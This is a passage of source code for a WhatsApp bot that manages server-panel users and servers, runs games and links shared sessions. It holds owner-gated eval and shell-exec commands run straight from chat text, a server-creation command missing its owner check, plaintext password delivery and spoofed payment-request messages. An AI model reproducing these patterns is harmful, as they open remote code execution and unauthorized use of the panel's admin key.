                                id: `.delusr ${a.attributes.id}`
                        }))
                    }]
                })
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    newReply(`Use command ${prefix}listusr ${res.meta.pagination.current_page + 1} To see the next page.`);
  }
}
break;
case "delsrv": {
      if (!isCreator) return newReply(ownernya)

let srv = args[0]
if (!srv) return newReply('ID?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return newReply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
break
case "delusr": {
  if (!isCreator) return newReply(ownernya)
let usr = args[0]
if (!usr) return newReply('ID?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return newReply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "addusr": {
if (!isCreator) return newReply(ownernya)
let s = text.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return newReply(`*Wrong format!*
Example :
${prefix + command} user,number`)
if (!username) return newReply(`Example : ${prefix+command} Username,@tag/nomor\n\nExample :\n${prefix+command} example,@user`)
if (!nomor) return newReply(`Example : ${prefix+command} Username,@tag/nomor\n\nExample :\n${prefix+command} example,@user`)
let u = m.quoted ? m.quoted.sender : s[1] ? s[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return newReply(`*Wrong format!*

Example :
${prefix + command} email,username,name,number/tag`);
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : s[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${xdate}
┗⬣ *PASSWORD SUCCESSFULLY SEND TO @${u.split`@`[0]}*`

let sections = [{
title: 'Paket Server Panel',
highlight_label: 'Recomended',
rows: [{
title: 'Unli',
description: `Unlimited Ram/Cpu`, 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,0/0,0`
},
{
title: '1Gb', 
description: "1Gb Ram/50 Cpu", 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,1200/1200,50`
},
{
title: '2Gb', 
description: "2Gb Ram/70 Cpu", 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,2200/2200,70`
},
{
title: '3Gb', 
description: "3Gb Ram/100 Cpu", 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,3200/3200,100`
},
{
title: '4Gb', 
description: "4Gb Ram/125 Cpu", 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,4200/4200,125`
},
{
title: '5Gb', 
description: "5Gb Ram/150 Cpu", 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,5200/5200,150`
},
{
title: '6Gb', 
description: "6Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,6200/6200,175`
},
{
title: '7Gb', 
description: "7Gb Ram/175 Cpu", 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,7200/7200,175`
},
{
title: '8Gb', 
description: "8Gb Ram/200 Cpu", 
id: `.addsrv ${user.first_name},${xdate},${user.id},15,1,8200/8200,200`
}]
}]

let listMessage = {
    title: 'List Panel', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By ToxxicTechInc', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: ToxxicTechInc.decodeJid(ToxxicTechInc.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: "PLEASE CHOOSE THE SIZE YOU WANT TO BUY",
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
ToxxicTechInc.sendMessage(u, { text: `*HERE ARE THE DETAILS OF YOUR PANEL ACCOUNT*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
case "listadmin": {
  if (!isCreator) return newReply(`Sorry, you can't see the user list.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Here List Admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await ToxxicTechInc.sendMessage(m.chat, { text: messageText }, { quoted: kalgans });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    newReply(`Use command ${prefix}listusr ${res.meta.pagination.current_page + 1} To see the next page.`);
  }
}
break;
case "addsrv": {
let s = text.split(',');
if (s.length < 7) return newReply(`*Wrong format!*

Example :
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
break
case "webpanel":
if (!isCreator) return newReply(ownernya)
ewe = `nih kak ${domain}`
await ToxxicTechInc.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break
case 'suspend': {
            if (!isCreator) return newReply(ownernya)
            let srv = args[0]
            if (!srv) return newReply('ID?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return newReply('*SERVER NOT FOUND*')
           newReply('*SUCCESSFULLY SUSPEND..*')
        }
            break
case 'unsuspend': {
            if (!isCreator) return newReply(ownernya)
            let srv = args[0]
            if (!srv) return newReply('ID?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return newReply('*SERVER NOT FOUND*')
           newReply('*SUCCESSFULLY UNLOCKED SUSPEND..*')
        }
            break
case 'startsrv': case 'stopsrv': case 'restartsrv': {
let action = command.replace('srv', '')
if (!isCreator) return newReply(ownernya)
let srv = args[0]
if (!srv) return newReply('ID?')
let f = await fetch(domain + "/api/client/servers/" + srv + "/power", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"signal": action
})
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
reply(`*SUCCESSFULLY ${action.toUpperCase()} THE SERVER*`)
}
break
case 'tutorial': {
await loading()
tut = `◎ © Hey ${pushname} 👋 Here The 
Tutorial Run Via Panel
https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P`
await ToxxicTechInc.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: tut,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
case 'cowboy': {
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
ToxxicTechInc.shoot = ToxxicTechInc.shoot || { musuh: [], shoot: [] }
if(/left/i.test(text)) {
    let left = [
      ["🤠", "・", "・", "・", "・"],
      ["・", "🤠", "・", "・", "・"],
      ["・", "・", "🤠", "・", "・"],
      ["・", "・", "・", "🤠", "・"],
      ["・", "・", "・", "・", "🤠"]
    ]
    if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 0) {
      ToxxicTechInc.shoot.shoot = left[0]
    } else if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 1) {
      ToxxicTechInc.shoot.shoot = left[0]
    } else if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 2) {
      ToxxicTechInc.shoot.shoot = left[1]
    } else if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 3) {
      ToxxicTechInc.shoot.shoot = left[2]
    } else if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 4) {
      ToxxicTechInc.shoot.shoot = left[3]
    }
    let teks = `🤠 Cowboy Chasing Criminals 🥷\n\n`
      teks += `Your territory:\n${ToxxicTechInc.shoot.shoot.join(" ")}\n`
      teks += `Criminals terriroty:\n${ToxxicTechInc.shoot.musuh.join(" ")}\n`
      teks += `Example : ${prefix + command} right or ${prefix + command} left for move to right/left and ${prefix + command} shoot to shoot`
    if(ToxxicTechInc.shoot.musuh.indexOf("🥷") === ToxxicTechInc.shoot.shoot.indexOf("🤠")) return newReply(teks)
return newReply(teks)
  } else if(/right/i.test(text)) {
    let right = [
      ["🤠", "・", "・", "・", "・"],
      ["・", "🤠", "・", "・", "・"],
      ["・", "・", "🤠", "・", "・"],
      ["・", "・", "・", "🤠", "・"],
      ["・", "・", "・", "・", "🤠"]
    ]
    if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 0) {
      ToxxicTechInc.shoot.shoot = right[1]
    } else if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 1) {
      ToxxicTechInc.shoot.shoot = right[2]
    } else if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 2) {
      ToxxicTechInc.shoot.shoot = right[3]
    } else if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 3) {
      ToxxicTechInc.shoot.shoot = right[4]
    } else if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == 4) {
      ToxxicTechInc.shoot.shoot = right[4]
    }
    let teks = `🤠 Cowboy Chacing Criminals 🥷\n\n`
      teks += `Your territory:\n${ToxxicTechInc.shoot.shoot.join(" ")}\n`
      teks += `Criminals terriroty:\n${ToxxicTechInc.shoot.musuh.join(" ")}\n`
      teks += `Example : ${prefix + command} right or ${prefix + command} left for move to right/left and ${prefix + command} shoot to shoot`
    if(ToxxicTechInc.shoot.musuh.indexOf("🥷") === ToxxicTechInc.shoot.shoot.indexOf("🤠")) return newReply(teks)
    return newReply(teks)
  } else if(/shoot/i.test(text)) {
    if(ToxxicTechInc.shoot.shoot.indexOf("🤠") == ToxxicTechInc.shoot.musuh.indexOf("🥷")) {
      ToxxicTechInc.shoot = {}
      ToxxicTechInc.sendTextWithMentions(m.chat, `🎉 Congratulations! you succeeded in chasing the criminals! 🎉`, m)
    }
  } else {
   let randMusuh = [
      ["🥷", "・", "・", "・", "・"],
      ["・", "🥷", "・", "・", "・"],
      ["・", "・", "🥷", "・", "・"],
      ["・", "・", "・", "🥷", "・"],
      ["・", "・", "・", "・", "🥷"]
    ]
   let randAku = [
      ["🤠", "・", "・", "・", "・"],
      ["・", "🤠", "・", "・", "・"],
      ["・", "・", "🤠", "・", "・"],
      ["・", "・", "・", "🤠", "・"],
      ["・", "・", "・", "・", "🤠"]
    ]
    let musuh = pickRandom(randMusuh)
   let aku = pickRandom(randAku)
    ToxxicTechInc.shoot.musuh = musuh
    ToxxicTechInc.shoot.shoot = aku
    let teks = `🤠 Cowboy Chasing Criminals 🥷\n\n`
      teks += `Your territory:\n${ToxxicTechInc.shoot.shoot.join(" ")}\n`
      teks += `Criminals terriroty:\n${ToxxicTechInc.shoot.musuh.join(" ")}\n`
      teks += `Example : ${prefix + command} right or ${prefix + command} left for move to right/left and ${prefix + command} shoot to shoot`
    if(ToxxicTechInc.shoot.musuh.indexOf("🥷") === ToxxicTechInc.shoot.shoot.indexOf("🤠")) return newReply(teks)
    return newReply(teks)
  }
}
break
case 'araara':
case 'baka':
case 'dosa':
case 'gambare':
case 'heeh':
case 'hello':
case 'konnichiwa':
case 'luvu':
case 'luvu2':
case 'moshi':
case 'moshi2':
case 'ohayo':
case 'ohayoghosaimase':
case 'oy':
case 'oyasumi':
case 'oyasuminasai':
case 'yareyare':
case 'yowaimo':
audiobuffy = fs.readFileSync(`./File/audio/${command}.mp3`)
await ToxxicTechInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
break
case 'gremory1': {
if (!isCreator) return m.reply('*For My Owner Only*')
joauuuuu = fs.readFileSync('./riasbug/gremory1.mp4')
ToxxicTechInc.sendMessage(from, { video: joauuuuu, mimetype: 'video/mp4', caption: `SPECIAL EDIT MADE BY TOXXIC` }, {quoted:fakestatus})
}
break
case 'gremory2': {
if (!isCreator) return m.reply('*For My Owner Only*')
joauuuu = fs.readFileSync('./riasbug/gremory2.mp4')
ToxxicTechInc.sendMessage(from, { video: joauuuu, mimetype: 'video/mp4', caption: `SPECIAL EDIT MADE BY TOXXIC` }, {quoted:fakestatus})
}
break
      case 'dice': case 'roll': {
        ToxxicTechInc.sendMessage(from, { react: { text: "🎲", key: m.key } })
        const result = Math.floor(Math.random() * 6) + 1; // Generate a random number between 1 and 6

        const diceMessage = `🎲 *Dice Roll Result:* ${result}`;

        newReply(diceMessage);
      }
        break;


      case 'flipcoin': case 'coin': {
        ToxxicTechInc.sendMessage(from, { react: { text: "☑️", key: m.key } });
        // Simulate flipping a coin (0 for heads, 1 for tails)
        const result = Math.random() < 0.5 ? 'Heads' : 'Tails';

        const flipCoinMessage = `🪙 *Coin Flip Result: ${result}*`;
        newReply(flipCoinMessage);
      }
        break;
              case 'rps': {
              ToxxicTechInc.sendMessage(from, { react: { text: "🤖", key: m.key } })
        const randomEmoji = manyemojis[Math.floor(Math.random() * manyemojis.length)];
        ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });

        // Check if the command includes a valid move (rock, paper, or scissors)
        const validMoves = ['rock', 'paper', 'scissors'];
        if (!args[0] || !validMoves.includes(args[0].toLowerCase())) {
          return newReply('Please provide a valid move: rock, paper, or scissors.');
        }

        // Generate a random move for the bot
        const botMove = validMoves[Math.floor(Math.random() * validMoves.length)];

        // Determine the winner
        const userMove = args[0].toLowerCase();
        let result;

        if (userMove === botMove) {
          result = 'It\'s a tie!';
        } else if (
          (userMove === 'rock' && botMove === 'scissors') ||
          (userMove === 'paper' && botMove === 'rock') ||
          (userMove === 'scissors' && botMove === 'paper')
        ) {
          result = `You *win!* 🥳 ${userMove} beats ${botMove}.`;
        } else {
          result = `You *lose!* 🫳🏻 ${botMove} beats ${userMove}.`;
        }

        // Send the result as a response
        newReply(`You chose ${userMove}.\nRias Ai chose ${botMove}.\n${result}`);
      }
        break;
      case "sharerias-pairing":
      ToxxicTechInc.sendMessage(from, { react: { text: "⚙️", key: m.key } })
        if (!isCreator) return reply("*`Only My Owner Can Use This Command`*")
  if (!text) return m.reply("*Error ! Use Like This: ${prefix}sharerias-pairing 234xxx*\nExample: ${prefix}sharerias-pairing 234123456789")
await sharerias(ToxxicTechInc, text, m, from)
            let furry = "`"
            await sleep(4800)
let jadibo = `*${furry}How To Use Share Rias Command${furry}*\n\n1. Click the three dots in the top right corner\n2. Tap Link Devices\n3. Tap Link a Device\n4. Tap Pair With Phone Number\n5. Paste This Code There\n\nNote: Code Will Expire Within 30 Seconds!\n\nYour Code: ${furry}${global.codepairing}${furry}\n`
let onlyprivjdb = '*Share Rias Was Success!*'

async function habuce () {
 ToxxicTechInc.sendMessage(`${text}@s.whatsapp.net`, {text:jadibo}, {quoted:fsaluran})
 setTimeout(() => {
 m.reply(onlyprivjdb)
 }, 1000)
}
if (global.typemenu === "v12") {
return habuce()
} else if (global.typemenu === "v11") {
return habuce()
 } else if (global.typemenu === "v10") {
let tekss9999 = jadibo;

let msghhhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ToxxicTechInc.decodeJid(ToxxicTechInc.user.id) },
   externalAdReply: { 
     title: 'Rias Share Command', 
     thumbnailUrl: 'https://i.ibb.co/yS8t5Gw/IMG-20240906-154744-545.jpg', 
     sourceUrl: websitex,
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss9999
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `> Share Rias V2`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: `𝐒𝐇𝐀𝐑𝐄 𝐑𝐈𝐀𝐒 𝐁𝐘 `,
   subtitle: "ᴛᴏxxɪᴄ",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"${global.codepairing}","id":"123456789","copy_code":"${global.codepairing}"}`
     },
   ],
 })
 })
 }
 }
}, {});

await ToxxicTechInc.relayMessage(`${text}@s.whatsapp.net`, msghhhhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhhhh.key.id
});

setTimeout(async () => {
   return m.reply(onlyprivjdb)
}, 1200)
}
        console.log('•STARTING SHARE BOT•')
        break
            case 'stop-sharerias':
            ToxxicTechInc.sendMessage(from, { react: { text: "⚙️", key: m.key } })
 if (!isCreator) return m.reply("*`For My Owner Only`*")
 if (!text) return m.reply("Like This ${prefix+command} 234xxx")
 const folderPath = `./sharedatabase/sharesession/${text}`; 

 if (!fs.existsSync(folderPath)) {
 return reply('Ending Share Rias');
 }

 try {
 fs.rmSync(folderPath, { recursive: true, force: true });
 reply('Session deleted');
 } catch (error) {
 m.reply('Error :', error);
 }
 break

 case 'list-sharerias': 
 ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
if (!isCreator) return m.reply("*`For My Owner Only`*")
try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
te = "*-- List sharerias --*\n\n"
for (let i of user){
y = await ToxxicTechInc.decodeJid(i.id)
te += " •• User : @" + y.split("@")[0] + "\n"
te += " •• Name : " + i.name + "\n\n"
}
ToxxicTechInc.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`Error Listing sharerias`)
}
break 

case 'start-sharerias':
ToxxicTechInc.sendMessage(from, { react: { text: "🔆", key: m.key } })
 if (!isCreator) return m.reply("*`For My Owner Only`*")
 if (!text) return m.reply("Use ${prefix+command} 234xxx")
try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
await sharerias(ToxxicTechInc, text, m, from)
} catch (err) {
m.reply(`Can not Start Sharing`)
}
break
case 'systeminfo': {
    if (!isCreator) return ownernya(); // Only allow the bot owner to use this command
    
    try {
        // Fetch system data
        const os = require('os');
        const cpus = os.cpus();
        const uptime = os.uptime();
        const totalMem = formatp(os.totalmem());
        const freeMem = formatp(os.freemem());
        const usedMem = formatp(os.totalmem() - os.freemem());
        const platform = os.platform();
        const arch = os.arch();
        const hostname = os.hostname();
        const cpuModel = cpus[0].model;
        const cpuSpeed = cpus[0].speed;
        const cpuCount = cpus.length;
        const loadAverage = os.loadavg().map(avg => avg.toFixed(2));

        // Format uptime to be more readable (hours, minutes, seconds)
        const formatUptime = (seconds) => {
            const h = Math.floor(seconds / 3600);
            const m = Math.floor((seconds % 3600) / 60);
            const s = Math.floor(seconds % 60);
            return `${h}h ${m}m ${s}s`;
        };

        // System data message template
        let teks = `⬣ *SYSTEM INFORMATION*\n\n`;
        teks += `◉ Hostname: ${hostname}\n`;
        teks += `◉ Platform: ${platform} (${arch})\n`;
        teks += `◉ CPU: ${cpuModel} (${cpuSpeed} MHz)\n`;
        teks += `◉ CPU Cores: ${cpuCount}\n`;
        teks += `◉ Load Average (1m, 5m, 15m): ${loadAverage.join(', ')}\n\n`;
        teks += `◉ Uptime: ${formatUptime(uptime)}\n\n`;
        teks += `◉ Total Memory: ${totalMem}\n`;
        teks += `◉ Used Memory: ${usedMem}\n`;
        teks += `◉ Free Memory: ${freeMem}\n\n`;

        // Send the formatted system data
        newReply(teks, m);
    } catch (error) {
        console.error(error); // Log any errors
        newReply('There was an error retrieving the system information. Please try again later.', m);
    }
}
break;
case 'generatepassword': {
    const length = parseInt(args[0]) || 12; // Default length is 12 if not provided
    const includeUppercase = args[1] === 'true'; // Include uppercase letters if specified
    const includeNumbers = args[2] === 'true'; // Include numbers if specified
    const includeSymbols = args[3] === 'true'; // Include symbols if specified

    const lowercaseChars = 'abcdefghijklmnopqrstuvwxyz';
    const uppercaseChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const numberChars = '0123456789';
    const symbolChars = '!@#$%^&*()_+-=[]{}|;:,.<>?';

    let characterSet = lowercaseChars; // Start with lowercase characters

    if (includeUppercase) characterSet += uppercaseChars;
    if (includeNumbers) characterSet += numberChars;
    if (includeSymbols) characterSet += symbolChars;

    // Generate the password
    let password = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characterSet.length);
        password += characterSet[randomIndex];
    }

    m.reply(`Your generated password is: *${password}*`, m);
}
break;
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return ownernya()
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return newReply(bang)
                    }
                    try {
                        newReply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        newReply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return ownernya()
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await newReply(evaled)
                    } catch (err) {
                        await newReply(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return ownernya()
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return newReply(err)
                        if (stdout) return newReply(stdout)
                    })
                }
                if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
ToxxicTechInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true, {quoted: m})
}
            }
    } catch (err) {
        console.log(util.format(err))
        let e = String(err)
ToxxicTechInc.sendMessage(global.creator, { text: "Hello Toxxic\n\n   [𝐍𝐞𝐰 𝐄𝐫𝐫𝐨𝐫 𝐃𝐞𝐭𝐞𝐜𝐭𝐞𝐝]   \n\n\n\n\n\n" + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
if (e.includes("conflict")) return
if (e.includes("Cannot derive from empty media key")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return
    }
}
